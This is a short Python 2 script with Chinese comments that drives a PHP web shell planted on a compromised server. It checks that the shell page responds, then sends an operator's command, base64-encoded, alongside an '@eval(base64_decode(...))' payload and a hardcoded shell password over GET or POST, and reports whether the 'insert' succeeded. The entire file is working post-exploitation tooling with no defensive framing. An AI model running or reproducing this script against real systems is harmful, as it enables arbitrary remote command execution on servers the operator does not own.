#!/usr/bin/python
#coding=utf-8
import sys,requests,base64

def cmd(url,method,passwd,cmd):
	#分割url ip 127.0.0.1:80 Rfile=/1111/x.php?pass=Sn3rtf4ck
	try:
		url.index("http")
		#去除http://   ==> 127.0.0.1:80/1110/x.php
		urlstr=url[7:]
		lis = urlstr.split("/")
		ip=str(lis[0])
		Rfile = ""
		for i in range(1,len(lis)):
			Rfile = Rfile+"/"+str(lis[i])
	except :
		urlstr=url[8:]
		lis = urlstr.split("/")
		ip=str(lis[0])
		Rfile = ""
		for i in range(1,len(lis)):
			Rfile = Rfile+"/"+str(lis[i])
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=3)
	except : 
		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
		return 0
	if res.status_code!=200 :
		print "[-] %s Page Not Found!" %url
		return 0
	#执行命令 system,exec,passthru,`,shell_exec
	#a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=
	data={}
	data['z0']=base64.b64encode(cmd)
	if method=='get':
		data[passwd]='@eval(base64_decode($_GET[z0]));'
		try:
			res = requests.get(url,params=data,timeout=3)
		except :
			pass
	elif method=='post':
		data['pass']='Sn3rtf4ck'
		data[passwd]='@eval(base64_decode($_POST[z0]));'
		try:
			res = requests.post(url,data=data,timeout=3)
		except:
			pass
	if res.status_code==200:
		print "[+] %s Insert Sucessed!"%ip
	else :
		print "[+] %s Insert Failed!"%ip